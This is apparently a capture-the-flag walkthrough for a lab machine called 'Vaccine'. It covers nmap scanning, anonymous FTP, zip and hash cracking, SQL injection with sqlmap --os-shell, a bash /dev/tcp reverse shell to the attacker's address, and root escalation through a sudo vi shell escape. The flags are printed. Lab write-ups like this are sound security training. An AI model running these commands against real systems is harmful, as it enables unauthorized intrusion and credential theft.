# Vaccine

#### The first task is to discover the services

    - We achieve this by running `nmap -sC -sV [IP]`.
    - There are three services running:
        1. http 
        2. ssh
        3. ftp
    - The answer to `Task 1` is `ftp`.

 #### The second task asked for the `username` which does not require a password.

    - The answer is `anonymous`.

#### The third task required us to connect to the server using anonymous and we downloaded the file we found name `backup.zip`.

    - `ftp [IP]`
    - `get backup.zip`

#### Next we attempt to unzip the file we downloaded but found that the file is encrypteed. So we will use `zip2john`, a script that comes with `John the Ripper`, to generate a hash and then use the ripper to crack the password.
    - `zip2john backup.zip > hash.txt`
    - `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
    - We got the password for the zip, we unzipped and found two files. `index.php` includes a md5 hash.
    - We will use https://crackstation.net to decrypt the hash. 
    - We find that password for admin is `qwerty789`

#### Remember that the server has a http port running, so we try visiting the page, which presents a login page, we use the above credentials to login. We notice a notice search request and we will use sqlmap to find more details.
    - Obtain session id from the page. Inspect element, storage, and cookies, copy the value of PHPSESSID.
    - We will run sqlmap with --os-shell option. Here is what the command looks like:
        - `sqlmap --url="http://10.129.148.118/dashboard.php?search=sandy" --cookie="PHPSESSID=5i6lg6q8ok7ni78o10g9t904l7" --os-shell`
    - With this we enter the os-shell. Now we must start a netcat server to start this session locally.
        - `nc -lvnp 4444`
        - On the shell enter the following:
            - `bash -c "bash -i >& /dev/tcp/10.10.14.79/4444 0>&1"` # Note: 10.10.14.79 is the tun0 address of the VM.
            - This will start the session locally. 
        - The session starts in postgres directory. `user.txt` found in parent postgresql directory.
        - User flag - `ec9b13ca4d6229cd5cc1e09980965bf7`.
    - On further recon, since port 80 was open, we visited the /var/www/html folder.
    - We found a password in `dashboard.php`.
        - pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!")
    
    - We will ssh into the system as postgres user.
    - Running sudo -l tells us that we can update `pg_hba.conf`. Use the same password.
    - So we open it `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`.

#### We can now attempt to escalate our privilege when the vi editor opens with the above file.
    - `:set shell=/bin/sh`
    - :shell
    - Now we get the shell. Running `whoami` reveals we are the root.
    - Enter the /root directory to find root.txt which consists of the root flag = `dd6e058e814260bc70e9bbdef2715849`.

